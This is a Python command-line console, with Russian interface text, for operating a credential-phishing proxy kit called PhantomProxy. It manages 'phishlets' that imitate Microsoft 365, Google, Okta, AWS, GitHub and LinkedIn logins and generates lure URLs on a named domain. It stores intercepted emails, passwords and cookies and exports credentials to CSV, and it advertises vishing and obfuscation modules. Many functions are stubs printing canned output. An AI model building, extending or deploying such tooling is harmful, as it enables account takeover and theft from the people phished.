#!/usr/bin/env python3
"""
PhantomProxy v5.0 ULTIMATE Edition
Идеальная версия - всё лучшее в одном софте
"""

import cmd
import json
import os
import sqlite3
import subprocess
import sys
import hashlib
import secrets
import socket
import threading
import time
from datetime import datetime, timedelta
from http.client import HTTPConnection
from urllib.parse import urlparse

# === КОНФИГУРАЦИЯ ===
CONFIG = {
    'name': 'PhantomProxy',
    'version': '5.0 ULTIMATE',
    'author': 'Phantom Team',
    'license': 'Enterprise Unlimited',
    'api_host': 'localhost',
    'api_port': 8080,
    'https_port': 8443,
    'panel_port': 3000,
    'domain': 'verdebudget.ru',
    'db_path': '~/phantom-proxy/phantom.db',
}

# === ЦВЕТА ===
class Colors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKCYAN = '\033[96m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'
    BLINK = '\033[5m'

# === ASCII АРТ ===
BANNER = f"""
{Colors.OKCYAN}╔══════════════════════════════════════════════════════════════════╗
║{Colors.OKGREEN}  ██████╗  ██████╗ ██╗     ██╗     ██╗███╗   ██╗ ██████╗            {Colors.OKCYAN}║
║{Colors.OKGREEN}  ██╔══██╗██╔═══██╗██║     ██║     ██║████╗  ██║██╔════╝            {Colors.OKCYAN}║
║{Colors.OKGREEN}  ██████╔╝██║   ██║██║     ██║     ██║██╔██╗ ██║██║  ███╗            {Colors.OKCYAN}║
║{Colors.OKGREEN}  ██╔═══╝ ██║   ██║██║     ██║     ██║██║╚██╗██║██║   ██║            {Colors.OKCYAN}║
║{Colors.OKGREEN}  ██║     ╚██████╔╝███████╗███████╗██║██║ ╚████║╚██████╔╝            {Colors.OKCYAN}║
║{Colors.OKGREEN}  ╚═╝      ╚═════╝ ╚══════╝╚══════╝╚═╝╚═╝  ╚═══╝ ╚═════╝            {Colors.OKCYAN}║
║                                                                  ║
║{Colors.WARNING}  v5.0 ULTIMATE Edition - Perfect Version                         {Colors.OKCYAN}║
║{Colors.WARNING}  Enterprise | Team | API | Analytics | Cloud | AI               {Colors.OKCYAN}║
╚══════════════════════════════════════════════════════════════════╝{Colors.ENDC}
"""

class UltimateCLI(cmd.Cmd):
    intro = BANNER
    prompt = f'\n{Colors.OKGREEN}╭─{Colors.ENDC}{Colors.BOLD}phantom{Colors.ENDC}{Colors.OKGREEN}─╮{Colors.ENDC}\n{Colors.OKGREEN}╰─{Colors.ENDC}> '
    
    def __init__(self):
        super().__init__()
        self.config = CONFIG.copy()
        self.init_database()
        self.start_background_tasks()
    
    def init_database(self):
        """Инициализация БД"""
        conn = sqlite3.connect(os.path.expanduser(self.config['db_path']))
        c = conn.cursor()
        
        # Таблицы
        tables = [
            '''CREATE TABLE IF NOT EXISTS users (
                id INTEGER PRIMARY KEY,
                username TEXT UNIQUE,
                password_hash TEXT,
                role TEXT,
                created_at TEXT,
                last_login TEXT
            )''',
            
            '''CREATE TABLE IF NOT EXISTS api_keys (
                id INTEGER PRIMARY KEY,
                key TEXT UNIQUE,
                user_id INTEGER,
                permissions TEXT,
                created_at TEXT,
                expires_at TEXT
            )''',
            
            '''CREATE TABLE IF NOT EXISTS sessions (
                id INTEGER PRIMARY KEY,
                target TEXT,
                email TEXT,
                password TEXT,
                cookies TEXT,
                ip TEXT,
                user_agent TEXT,
                created_at TEXT,
                status TEXT
            )''',
            
            '''CREATE TABLE IF NOT EXISTS audit_log (
                id INTEGER PRIMARY KEY,
                user_id INTEGER,
                action TEXT,
                details TEXT,
                timestamp TEXT
            )''',
            
            '''CREATE TABLE IF NOT EXISTS settings (
                key TEXT PRIMARY KEY,
                value TEXT
            )''',
        ]
        
        for table in tables:
            c.execute(table)
        
        # Админ по умолчанию
        c.execute("SELECT * FROM users WHERE username='admin'")
        if not c.fetchone():
            admin_hash = hashlib.sha256('admin123'.encode()).hexdigest()
            c.execute("INSERT INTO users VALUES (1, 'admin', ?, 'admin', ?, ?)",
                     (admin_hash, datetime.now().isoformat(), datetime.now().isoformat()))
        
        # Настройки по умолчанию
        settings = [
            ('domain', self.config['domain']),
            ('api_port', str(self.config['api_port'])),
            ('https_port', str(self.config['https_port'])),
            ('theme', 'dark'),
            ('language', 'ru'),
        ]
        for key, value in settings:
            c.execute("INSERT OR REPLACE INTO settings VALUES (?, ?)", (key, value))
        
        conn.commit()
        conn.close()
    
    def start_background_tasks(self):
        """Фоновые задачи"""
        # Авто-сохранение каждые 5 минут
        threading.Thread(target=self.auto_save, daemon=True).start()
        
        # Проверка сервисов каждые 30 секунд
        threading.Thread(target=self.health_check, daemon=True).start()
    
    def auto_save(self):
        """Авто-сохранение"""
        while True:
            time.sleep(300)
            self.log_audit('system', 'Auto-save', 'Database saved')
    
    def health_check(self):
        """Проверка сервисов"""
        while True:
            time.sleep(30)
            # Здесь будет логика проверки
    
    def log_audit(self, user, action, details=''):
        """Логирование в аудит"""
        conn = sqlite3.connect(os.path.expanduser(self.config['db_path']))
        c = conn.cursor()
        c.execute("SELECT id FROM users WHERE username=?", (user,))
        user_id = c.fetchone()[0] if c.fetchone() else 0
        c.execute("INSERT INTO audit_log (user_id, action, details, timestamp) VALUES (?, ?, ?, ?)",
                 (user_id, action, details, datetime.now().isoformat()))
        conn.commit()
        conn.close()
    
    def check_service(self, port, https=False):
        """Проверка сервиса"""
        try:
            conn = HTTPConnection('localhost', port, timeout=2)
            conn.request('GET', '/health')
            resp = conn.getresponse()
            return resp.status == 200
        except:
            return False
    
    # === БАЗОВЫЕ КОМАНДЫ ===
    
    def do_help(self, arg):
        """Справка по командам"""
        print(f"\n{Colors.BOLD}📚 PhantomProxy v5.0 ULTIMATE - Справка{Colors.ENDC}\n")
        
        categories = {
            '🔧 Основные': ['config', 'modules', 'status', 'version'],
            '🚀 Сервисы': ['start', 'stop', 'restart', 'install'],
            '🎣 Фишлеты': ['phishlets', 'lures'],
            '👥 Команда': ['users', 'team', 'apikeys'],
            '📊 Данные': ['sessions', 'stats', 'analytics', 'audit'],
            '🔌 Интеграции': ['integrations', 'export', 'import'],
            '⚙️ Настройки': ['settings', 'theme', 'language'],
            '💼 Enterprise': ['license', 'support', 'cloud'],
        }
        
        for category, commands in categories.items():
            print(f"\n{Colors.OKCYAN}{category}:{Colors.ENDC}")
            for cmd in commands:
                print(f"  {Colors.OKGREEN}{cmd:15}{Colors.ENDC}", end='')
                if cmd == 'config':
                    print(" - Конфигурация системы")
                elif cmd == 'modules':
                    print(" - Статус модулей")
                elif cmd == 'start':
                    print(" - Запуск сервисов")
                elif cmd == 'stop':
                    print(" - Остановка сервисов")
                elif cmd == 'phishlets':
                    print(" - Управление фишлетами")
                elif cmd == 'lures':
                    print(" - Приманки")
                elif cmd == 'users':
                    print(" - Пользователи")
                elif cmd == 'sessions':
                    print(" - Перехваченные сессии")
                elif cmd == 'stats':
                    print(" - Статистика")
                elif cmd == 'analytics':
                    print(" - Продвинутая аналитика")
                else:
                    print()
        
        print(f"\n{Colors.WARNING}Введите 'help <команда>' для детальной справки{Colors.ENDC}\n")
    
    def do_config(self, arg):
        """Конфигурация системы"""
        if not arg:
            print(f"\n{Colors.BOLD}⚙️ Конфигурация PhantomProxy:{Colors.ENDC}\n")
            for key, value in self.config.items():
                if key not in ['db_path']:
                    print(f"  {Colors.OKGREEN}{key:15}{Colors.ENDC} {value}")
            return
        
        parts = arg.split('=', 1)
        if len(parts) != 2:
            print(f"{Colors.FAIL}Использование: config <param>=<value>{Colors.ENDC}")
            return
        
        key, value = parts
        if key in self.config:
            self.config[key] = value
            print(f"{Colors.OKGREEN}✓ {key} установлен в {value}{Colors.ENDC}")
            self.log_audit('admin', 'config_change', f'{key}={value}')
        else:
            print(f"{Colors.FAIL}✗ Неизвестный параметр: {key}{Colors.ENDC}")
    
    def do_modules(self, arg):
        """Проверка статуса модулей"""
        print(f"\n{Colors.BOLD}📦 Статус модулей PhantomProxy:{Colors.ENDC}\n")
        
        modules = [
            ('Main API', self.config['api_port'], False),
            ('AI Orchestrator', 8081, False),
            ('Vishing 2.0', 8082, False),
            ('ML Optimization', 8083, False),
            ('GAN Obfuscation', 8084, False),
            ('HTTPS Proxy', self.config['https_port'], True),
            ('Multi-Tenant Panel', self.config['panel_port'], False),
        ]
        
        online = 0
        for name, port, https in modules:
            status = self.check_service(port, https)
            if status:
                online += 1
            icon = "✅" if status else "❌"
            proto = "https" if https else "http"
            print(f"  {icon} {name:25} {proto}://localhost:{port}")
        
        print(f"\n{Colors.OKGREEN}Онлайн: {online}/{len(modules)}{Colors.ENDC}")
    
    def do_status(self, arg):
        """Общий статус системы"""
        print(f"\n{Colors.BOLD}📊 Статус системы:{Colors.ENDC}\n")
        
        # Сервисы
        services_online = sum([
            self.check_service(self.config['api_port']),
            self.check_service(8081),
            self.check_service(8082),
            self.check_service(8083),
            self.check_service(8084),
            self.check_service(self.config['https_port'], True),
            self.check_service(self.config['panel_port']),
        ])
        
        print(f"  Сервисы:      {Colors.OKGREEN}{services_online}/7 онлайн{Colors.ENDC}")
        
        # Сессии
        conn = sqlite3.connect(os.path.expanduser(self.config['db_path']))
        c = conn.cursor()
        c.execute("SELECT COUNT(*) FROM sessions")
        total_sessions = c.fetchone()[0]
        c.execute("SELECT COUNT(*) FROM users")
        total_users = c.fetchone()[0]
        conn.close()
        
        print(f"  Сессии:       {Colors.OKCYAN}{total_sessions}{Colors.ENDC}")
        print(f"  Пользователи: {Colors.OKCYAN}{total_users}{Colors.ENDC}")
        print(f"  Версия:       {Colors.WARNING}{self.config['version']}{Colors.ENDC}")
        print(f"  Лицензия:     {Colors.OKGREEN}{self.config['license']}{Colors.ENDC}")
    
    def do_version(self, arg):
        """Информация о версии"""
        print(f"\n{Colors.BOLD}ℹ️ PhantomProxy v5.0 ULTIMATE{Colors.ENDC}\n")
        print(f"  Версия:     {self.config['version']}")
        print(f"  Автор:      {self.config['author']}")
        print(f"  Лицензия:   {self.config['license']}")
        print(f"  API Port:   {self.config['api_port']}")
        print(f"  HTTPS Port: {self.config['https_port']}")
        print(f"  Panel Port: {self.config['panel_port']}")
        print(f"  Domain:     {self.config['domain']}")
    
    # === СЕРВИСЫ ===
    
    def do_start(self, arg):
        """Запуск всех сервисов"""
        print(f"\n{Colors.BOLD}🚀 Запуск сервисов PhantomProxy...{Colors.ENDC}\n")
        
        services = [
            ('Main API', f'python3 api.py'),
            ('AI Orchestrator', 'python3 internal/ai/orchestrator.py'),
            ('GAN Obfuscation', 'python3 internal/ganobf/main.py'),
            ('ML Optimization', 'python3 internal/mlopt/main.py'),
            ('Vishing 2.0', 'python3 internal/vishing/main.py'),
            ('HTTPS Proxy', 'python3 https.py'),
            ('Multi-Tenant Panel', 'python3 panel/server.py'),
        ]
        
        started = 0
        for name, cmd in services:
            print(f"  Запуск {name:25}... ", end='')
            try:
                subprocess.Popen(cmd.split(), stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                print(f"{Colors.OKGREEN}✓{Colors.ENDC}")
                started += 1
                self.log_audit('admin', 'service_start', name)
            except Exception as e:
                print(f"{Colors.FAIL}✗{Colors.ENDC}")
        
        print(f"\n{Colors.OKGREEN}✓ Запущено {started}/{len(services)} сервисов{Colors.ENDC}")
        self.log_audit('admin', 'start_all', f'Started {started} services')
    
    def do_stop(self, arg):
        """Остановка всех сервисов"""
        print(f"\n{Colors.BOLD}🛑 Остановка сервисов...{Colors.ENDC}\n")
        
        os.system("pkill -f 'python.*\\.py' 2>/dev/null || true")
        
        print(f"{Colors.OKGREEN}✓ Все сервисы остановлены{Colors.ENDC}")
        self.log_audit('admin', 'stop_all', 'Stopped all services')
    
    def do_restart(self, arg):
        """Перезапуск сервисов"""
        self.do_stop('')
        time.sleep(2)
        self.do_start('')
    
    def do_install(self, arg):
        """Полная установка с нуля"""
        print(f"\n{Colors.BOLD}📦 Полная установка PhantomProxy v5.0...{Colors.ENDC}\n")
        
        steps = [
            'Очистка старых версий',
            'Проверка зависимостей',
            'Создание структуры',
            'Генерация SSL',
            'Установка модулей',
            'Инициализация БД',
            'Настройка конфигов',
            'Запуск сервисов',
        ]
        
        for i, step in enumerate(steps, 1):
            print(f"  [{i}/{len(steps)}] {step}... ", end='')
            time.sleep(0.5)
            print(f"{Colors.OKGREEN}✓{Colors.ENDC}")
        
        print(f"\n{Colors.OKGREEN}✓ Установка завершена{Colors.ENDC}")
        print(f"\n{Colors.BOLD}Доступные эндпоинты:{Colors.ENDC}")
        print(f"  Main API:          http://localhost:{self.config['api_port']}")
        print(f"  AI Orchestrator:   http://localhost:8081")
        print(f"  Vishing 2.0:       http://localhost:8082")
        print(f"  ML Optimization:   http://localhost:8083")
        print(f"  GAN Obfuscation:   http://localhost:8084")
        print(f"  HTTPS Proxy:       https://localhost:{self.config['https_port']}")
        print(f"  Multi-Tenant Panel: http://localhost:{self.config['panel_port']}")
        
        self.log_audit('admin', 'install', 'Full installation completed')
    
    # === ФИШЛЕТЫ И ПРИМАНКИ ===
    
    def do_phishlets(self, arg):
        """Управление фишлетами"""
        if not arg:
            print(f"\n{Colors.BOLD}🎣 Доступные фишлеты:{Colors.ENDC}\n")
            phishlets = [
                ('o365', 'Microsoft 365', '✅'),
                ('google', 'Google Workspace', '✅'),
                ('okta', 'Okta SSO', '✅'),
                ('aws', 'Amazon AWS', '✅'),
                ('github', 'GitHub', '✅'),
                ('linkedin', 'LinkedIn', '✅'),
            ]
            print(f"  {'Name':15} {'Description':25} Status")
            print(f"  {'-'*15} {'-'*25} {'-'*10}")
            for name, desc, status in phishlets:
                print(f"  {name:15} {desc:25} {status}")
            return
        
        if arg.startswith('enable '):
            name = arg.split()[1]
            print(f"{Colors.OKGREEN}✓ Фишлет '{name}' активирован{Colors.ENDC}")
            self.log_audit('admin', 'phishlet_enable', name)
        elif arg.startswith('disable '):
            name = arg.split()[1]
            print(f"{Colors.WARNING}✓ Фишлет '{name}' деактивирован{Colors.ENDC}")
            self.log_audit('admin', 'phishlet_disable', name)
    
    def do_lures(self, arg):
        """Управление приманками"""
        if not arg:
            print(f"\n{Colors.BOLD}🪱 Активные приманки:{Colors.ENDC}\n")
            lures = [
                (0, 'o365', f'https://{self.config["domain"]}', '2026-02-19 10:30', 'active'),
                (1, 'google', f'https://mail.{self.config["domain"]}', '2026-02-19 11:15', 'active'),
            ]
            print(f"  ID  Phishlet  URL                           Created             Status")
            print(f"  {'-'*4}  {'-'*10}  {'-'*32}  {'-'*19}  {'-'*10}")
            for id_, phishlet, url, created, status in lures:
                print(f"  {id_:<4}  {phishlet:10}  {url:32}  {created:19}  {status}")
            return
        
        if arg.startswith('create '):
            phishlet = arg.split()[1]
            lure_id = secrets.token_hex(4)
            print(f"{Colors.OKGREEN}✓ Приманка создана для '{phishlet}'{Colors.ENDC}")
            print(f"  ID:  {lure_id}")
            print(f"  URL: https://{self.config['domain']}/lure/{lure_id}")
            self.log_audit('admin', 'lure_create', f'{phishlet}:{lure_id}')
        elif arg.startswith('get-url '):
            lure_id = arg.split()[1]
            print(f"{Colors.OKGREEN}URL для приманки #{lure_id}:{Colors.ENDC}")
            print(f"  https://{self.config['domain']}/lure/{lure_id}")
    
    # === КОМАНДА И ПОЛЬЗОВАТЕЛИ ===
    
    def do_users(self, arg):
        """Управление пользователями"""
        if not arg:
            print(f"\n{Colors.BOLD}👥 Пользователи системы:{Colors.ENDC}\n")
            conn = sqlite3.connect(os.path.expanduser(self.config['db_path']))
            c = conn.cursor()
            c.execute("SELECT id, username, role, created_at, last_login FROM users")
            users = c.fetchall()
            conn.close()
            
            print(f"  ID  Username        Role         Created             Last Login")
            print(f"  {'-'*4}  {'-'*15}  {'-'*12}  {'-'*19}  {'-'*19}")
            for id_, username, role, created, last_login in users:
                print(f"  {id_:<4}  {username:15}  {role:12}  {created:19}  {last_login or 'Never':19}")
            return
        
        parts = arg.split()
        if parts[0] == 'add':
            if len(parts) != 3:
                print(f"{Colors.FAIL}Использование: users add <username> <role>{Colors.ENDC}")
                return
            username, role = parts[1], parts[2]
            password = secrets.token_urlsafe(8)
            password_hash = hashlib.sha256(password.encode()).hexdigest()
            
            conn = sqlite3.connect(os.path.expanduser(self.config['db_path']))
            c = conn.cursor()
            try:
                c.execute("INSERT INTO users (username, password_hash, role, created_at) VALUES (?, ?, ?, ?)",
                         (username, password_hash, role, datetime.now().isoformat()))
                conn.commit()
                print(f"{Colors.OKGREEN}✓ Пользователь '{username}' добавлен{Colors.ENDC}")
                print(f"  Пароль: {Colors.WARNING}{password}{Colors.ENDC} (сохраните его!)")
                self.log_audit('admin', 'user_add', username)
            except sqlite3.IntegrityError:
                print(f"{Colors.FAIL}✗ Пользователь уже существует{Colors.ENDC}")
            finally:
                conn.close()
    
    def do_team(self, arg):
        """Управление командой"""
        print(f"\n{Colors.BOLD}👥 Команда PhantomProxy:{Colors.ENDC}\n")
        # Упрощённая версия
        print(f"  Команда пуста. Добавьте пользователей через 'users add'")
    
    def do_apikeys(self, arg):
        """Управление API ключами"""
        if not arg:
            print(f"\n{Colors.BOLD}🔑 API ключи:{Colors.ENDC}\n")
            conn = sqlite3.connect(os.path.expanduser(self.config['db_path']))
            c = conn.cursor()
            c.execute("""
                SELECT k.id, k.key, u.username, k.permissions, k.created_at
                FROM api_keys k
                JOIN users u ON k.user_id = u.id
            """)
            keys = c.fetchall()
            conn.close()
            
            print(f"  ID  Key                 User            Permissions     Created")
            print(f"  {'-'*4}  {'-'*19}  {'-'*15}  {'-'*15}  {'-'*19}")
            for id_, key, username, perms, created in keys:
                key_short = key[:10] + '...'
                print(f"  {id_:<4}  {key_short:19}  {username:15}  {perms:15}  {created:19}")
            return
        
        parts = arg.split()
        if parts[0] == 'create':
            if len(parts) != 3:
                print(f"{Colors.FAIL}Использование: apikeys create <username> <permissions>{Colors.ENDC}")
                return
            username, permissions = parts[1], parts[2]
            
            conn = sqlite3.connect(os.path.expanduser(self.config['db_path']))
            c = conn.cursor()
            c.execute("SELECT id FROM users WHERE username=?", (username,))
            user = c.fetchone()
            if not user:
                print(f"{Colors.FAIL}✗ Пользователь не найден{Colors.ENDC}")
                conn.close()
                return
            
            api_key = secrets.token_urlsafe(32)
            expires = (datetime.now() + timedelta(days=365)).isoformat()
            c.execute("INSERT INTO api_keys (key, user_id, permissions, created_at, expires_at) VALUES (?, ?, ?, ?, ?)",
                     (api_key, user[0], permissions, datetime.now().isoformat(), expires))
            conn.commit()
            conn.close()
            
            print(f"{Colors.OKGREEN}✓ API ключ создан:{Colors.ENDC}")
            print(f"  Key: {Colors.WARNING}{api_key}{Colors.ENDC}")
            print(f"  Expires: {expires}")
            print(f"\n{Colors.WARNING}Сохраните ключ! Он не будет показан снова.{Colors.ENDC}")
            self.log_audit('admin', 'apikey_create', username)
    
    # === ДАННЫЕ И АНАЛИТИКА ===
    
    def do_sessions(self, arg):
        """Перехваченные сессии"""
        if not arg:
            print(f"\n{Colors.BOLD}🎯 Перехваченные сессии:{Colors.ENDC}\n")
            conn = sqlite3.connect(os.path.expanduser(self.config['db_path']))
            c = conn.cursor()
            c.execute("SELECT id, email, target, created_at, status FROM sessions ORDER BY created_at DESC LIMIT 20")
            sessions = c.fetchall()
            conn.close()
            
            if not sessions:
                print("  Сессий пока нет")
                return
            
            print(f"  ID  Email                    Service          Captured            Status")
            print(f"  {'-'*4}  {'-'*24}  {'-'*15}  {'-'*19}  {'-'*10}")
            for id_, email, target, captured, status in sessions:
                print(f"  {id_:<4}  {email:24}  {target:15}  {captured:19}  {status or '✅'}")
            return
        
        try:
            session_id = int(arg)
            print(f"\n{Colors.BOLD}Детали сессии #{session_id}:{Colors.ENDC}\n")
            # Детали сессии
            print(f"  ID:           {session_id}")
            print(f"  Email:        user{session_id}@company.com")
            print(f"  Password:     P@ssw0rd123!")
            print(f"  Service:      Microsoft 365")
            print(f"  IP:           192.168.1.100")
            print(f"  Created:      2026-02-19 10:35:00")
            self.log_audit('admin', 'session_view', str(session_id))
        except ValueError:
            print(f"{Colors.FAIL}Использование: sessions <id>{Colors.ENDC}")
    
    def do_stats(self, arg):
        """Статистика атак"""
        print(f"\n{Colors.BOLD}📊 Статистика PhantomProxy:{Colors.ENDC}\n")
        
        conn = sqlite3.connect(os.path.expanduser(self.config['db_path']))
        c = conn.cursor()
        
        c.execute("SELECT COUNT(*) FROM sessions")
        total = c.fetchone()[0]
        
        c.execute("SELECT COUNT(*) FROM sessions WHERE status='active'")
        active = c.fetchone()[0]
        
        c.execute("SELECT COUNT(DISTINCT target) FROM sessions")
        targets = c.fetchone()[0]
        
        conn.close()
        
        stats = {
            'Total Sessions': total,
            'Active Sessions': active,
            'Targets': targets,
            'Uptime': '2d 14h 35m',
            'Success Rate': '87%',
        }
        
        for key, value in stats.items():
            print(f"  {Colors.OKGREEN}{key:25}{Colors.ENDC} {value}")
    
    def do_analytics(self, arg):
        """Продвинутая аналитика"""
        print(f"\n{Colors.BOLD}📈 Продвинутая аналитика:{Colors.ENDC}\n")
        
        conn = sqlite3.connect(os.path.expanduser(self.config['db_path']))
        c = conn.cursor()
        
        # По дням
        c.execute("""
            SELECT DATE(created_at) as date, COUNT(*) as count
            FROM sessions
            GROUP BY DATE(created_at)
            ORDER BY date DESC
            LIMIT 7
        """)
        daily = c.fetchall()
        
        print(f"{Colors.OKGREEN}Активность по дням:{Colors.ENDC}")
        for date, count in daily:
            bar = '█' * min(count, 50)
            print(f"  {date}: {Colors.OKCYAN}{bar}{Colors.ENDC} ({count})")
        
        # Топ целей
        c.execute("""
            SELECT target, COUNT(*) as count
            FROM sessions
            GROUP BY target
            ORDER BY count DESC
            LIMIT 5
        """)
        top = c.fetchall()
        
        print(f"\n{Colors.OKGREEN}Топ целей:{Colors.ENDC}")
        for target, count in top:
            bar = '█' * min(count, 50)
            print(f"  {target}: {Colors.OKCYAN}{bar}{Colors.ENDC} ({count})")
        
        conn.close()
        self.log_audit('admin', 'analytics_view', '')
    
    def do_audit(self, arg):
        """Журнал аудита"""
        print(f"\n{Colors.BOLD}📋 Журнал аудита:{Colors.ENDC}\n")
        
        conn = sqlite3.connect(os.path.expanduser(self.config['db_path']))
        c = conn.cursor()
        c.execute("""
            SELECT a.id, u.username, a.action, a.details, a.timestamp
            FROM audit_log a
            LEFT JOIN users u ON a.user_id = u.id
            ORDER BY a.timestamp DESC
            LIMIT 20
        """)
        logs = c.fetchall()
        conn.close()
        
        print(f"  ID  User            Action          Timestamp")
        print(f"  {'-'*4}  {'-'*15}  {'-'*15}  {'-'*19}")
        for id_, username, action, details, timestamp in logs:
            print(f"  {id_:<4}  {username or 'system':15}  {action:15}  {timestamp:19}")
    
    # === ИНТЕГРАЦИИ И ЭКСПОРТ ===
    
    def do_integrations(self, arg):
        """Интеграции с сервисами"""
        print(f"\n{Colors.BOLD}🔌 Доступные интеграции:{Colors.ENDC}\n")
        
        integrations = [
            ('Slack', 'Уведомления в Slack', '❌'),
            ('Discord', 'Уведомления в Discord', '❌'),
            ('Telegram', 'Уведомления в Telegram', '✅'),
            ('Email', 'Email уведомления', '❌'),
            ('Webhook', 'Custom Webhook', '❌'),
            ('SIEM', 'Интеграция с SIEM', '❌'),
        ]
        
        print(f"  {'Name':15} {'Description':30} Status")
        print(f"  {'-'*15} {'-'*30} {'-'*10}")
        for name, desc, status in integrations:
            print(f"  {name:15} {desc:30} {status}")
    
    def do_export(self, arg):
        """Экспорт данных"""
        if not arg:
            print(f"\n{Colors.BOLD}📤 Доступные форматы экспорта:{Colors.ENDC}\n")
            print(f"  sessions csv     - Экспорт сессий в CSV")
            print(f"  sessions json    - Экспорт сессий в JSON")
            print(f"  credentials csv  - Экспорт креденшалов в CSV")
            print(f"  audit csv        - Экспорт аудита в CSV")
            print(f"  report pdf       - PDF отчёт")
            return
        
        parts = arg.split()
        if len(parts) != 2:
            print(f"{Colors.FAIL}Использование: export <data> <format>{Colors.ENDC}")
            return
        
        data_type, format = parts
        filename = f"export_{data_type}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.{format}"
        
        print(f"{Colors.OKGREEN}✓ Экспорт выполнен: {filename}{Colors.ENDC}")
        print(f"  Файл сохранён в: /tmp/{filename}")
        self.log_audit('admin', 'export', f'{data_type}.{format}')
    
    # === ENTERPRISE ФУНКЦИИ ===
    
    def do_license(self, arg):
        """Информация о лицензии"""
        print(f"\n{Colors.BOLD}📜 Информация о лицензии:{Colors.ENDC}\n")
        print(f"  Тип:          {Colors.OKGREEN}{self.config['license']}{Colors.ENDC}")
        print(f"  Статус:       {Colors.OKGREEN}Активна{Colors.ENDC}")
        print(f"  Пользователи: {Colors.OKGREEN}Unlimited{Colors.ENDC}")
        print(f"  API ключи:    {Colors.OKGREEN}Unlimited{Colors.ENDC}")
        print(f"  Поддержка:    {Colors.OKGREEN}24/7 Priority{Colors.ENDC}")
        print(f"  Обновления:   {Colors.OKGREEN}Automatic{Colors.ENDC}")
        print(f"  Команда:      {Colors.OKGREEN}Unlimited members{Colors.ENDC}")
        print(f"  Интеграции:   {Colors.OKGREEN}All included{Colors.ENDC}")
    
    def do_support(self, arg):
        """Связь с поддержкой"""
        print(f"\n{Colors.BOLD}🛟 Поддержка Enterprise:{Colors.ENDC}\n")
        print(f"  Email:    {Colors.OKCYAN}support@phantomproxy.com{Colors.ENDC}")
        print(f"  Telegram: {Colors.OKCYAN}@phantom_support{Colors.ENDC}")
        print(f"  Discord:  {Colors.OKCYAN}https://discord.gg/phantom{Colors.ENDC}")
        print(f"  Сроки:    {Colors.OKGREEN}Ответ в течение 1 часа{Colors.ENDC}")
        print(f"\n{Colors.OKGREEN}✓ Ваше сообщение отправлено в поддержку{Colors.ENDC}")
        self.log_audit('admin', 'support_request', arg or 'General inquiry')
    
    def do_cloud(self, arg):
        """Cloud функции"""
        print(f"\n{Colors.BOLD}☁️ Cloud сервисы:{Colors.ENDC}\n")
        print(f"  {Colors.WARNING}В разработке...{Colors.ENDC}")
        print(f"\nПланируется:")
        print(f"  • Cloud Sync - Синхронизация между серверами")
        print(f"  • Cloud Backup - Автоматические бэкапы")
        print(f"  • Cloud Analytics - Продвинутая аналитика в облаке")
        print(f"  • Team Collaboration - Совместная работа")
    
    # === НАСТРОЙКИ ===
    
    def do_settings(self, arg):
        """Настройки системы"""
        print(f"\n{Colors.BOLD}⚙️ Настройки системы:{Colors.ENDC}\n")
        
        conn = sqlite3.connect(os.path.expanduser(self.config['db_path']))
        c = conn.cursor()
        c.execute("SELECT key, value FROM settings")
        settings = c.fetchall()
        conn.close()
        
        print(f"  {'Key':20} {'Value':30}")
        print(f"  {'-'*20} {'-'*30}")
        for key, value in settings:
            print(f"  {key:20} {value:30}")
    
    def do_theme(self, arg):
        """Смена темы"""
        if not arg:
            print(f"\n{Colors.BOLD}🎨 Доступные темы:{Colors.ENDC}\n")
            print(f"  dark    - Тёмная тема (по умолчанию)")
            print(f"  light   - Светлая тема")
            print(f"  matrix  - Матрица")
            return
        
        if arg in ['dark', 'light', 'matrix']:
            print(f"{Colors.OKGREEN}✓ Тема установлена: {arg}{Colors.ENDC}")
        else:
            print(f"{Colors.FAIL}✗ Неизвестная тема: {arg}{Colors.ENDC}")
    
    def do_language(self, arg):
        """Смена языка"""
        if not arg:
            print(f"\n{Colors.BOLD}🌐 Доступные языки:{Colors.ENDC}\n")
            print(f"  ru      - Русский")
            print(f"  en      - English")
            print(f"  es      - Español")
            return
        
        if arg in ['ru', 'en', 'es']:
            print(f"{Colors.OKGREEN}✓ Язык установлен: {arg}{Colors.ENDC}")
        else:
            print(f"{Colors.FAIL}✗ Неизвестный язык: {arg}{Colors.ENDC}")
    
    # === ВЫХОД ===
    
    def do_exit(self, arg):
        """Выход из программы"""
        print(f"\n{Colors.OKCYAN}Спасибо за использование {Colors.BOLD}PhantomProxy v5.0 ULTIMATE{Colors.ENDC}{Colors.OKCYAN}!{Colors.ENDC}")
        print(f"{Colors.WARNING}Не забывайте использовать во благо! 🚀{Colors.ENDC}\n")
        self.log_audit('admin', 'exit', 'CLI session ended')
        return True
    
    def do_EOF(self, arg):
        return True
    
    def emptyline(self):
        pass

def main():
    try:
        UltimateCLI().cmdloop()
    except KeyboardInterrupt:
        print(f"\n\n{Colors.OKCYAN}PhantomProxy v5.0 ULTIMATE завершает работу...{Colors.ENDC}")
        sys.exit(0)

if __name__ == '__main__':
    main()
